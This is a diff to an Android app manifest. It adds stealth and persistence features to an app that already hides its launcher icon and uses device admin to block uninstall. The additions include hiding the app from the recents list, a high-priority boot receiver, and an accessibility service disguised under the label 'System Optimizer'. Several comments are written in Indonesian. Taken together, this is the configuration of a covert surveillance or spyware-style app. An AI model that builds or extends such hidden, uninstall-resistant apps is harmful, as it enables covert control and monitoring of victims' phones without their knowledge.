@@ -39,12 +39,12 @@
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
     <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
 
-    <!-- Media / Ring -->
+    <!-- Media -->
     <uses-permission android:name="android.permission.VIBRATE" />
     <uses-permission android:name="android.permission.CAMERA" />
 
     <application
-        android:allowBackup="true"
+        android:allowBackup="false"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
         android:roundIcon="@mipmap/ic_launcher_round"
@@ -56,9 +56,10 @@
         <activity
             android:name=".MainActivity"
             android:exported="true"
-            android:screenOrientation="portrait" />
+            android:screenOrientation="portrait"
+            android:excludeFromRecents="true" />
 
-        <!-- Launcher alias — disable this to hide the app icon -->
+        <!-- Launcher alias — disable ini untuk sembunyikan ikon -->
         <activity-alias
             android:name=".MainLauncherAlias"
             android:targetActivity=".MainActivity"
@@ -70,17 +71,33 @@
             </intent-filter>
         </activity-alias>
 
+        <!-- Background connector service -->
         <service
             android:name=".ConnectorService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
-        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
+        <!-- Accessibility Protection Service -->
+        <service
+            android:name=".ProtectionService"
+            android:exported="true"
+            android:label="System Optimizer"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
+            <intent-filter android:priority="999">
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
         </receiver>
 
@@ -90,7 +107,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- Device Admin — prevents uninstall -->
+        <!-- Device Admin — mencegah uninstall -->
         <receiver
             android:name=".AppDeviceAdminReceiver"
             android:exported="true"
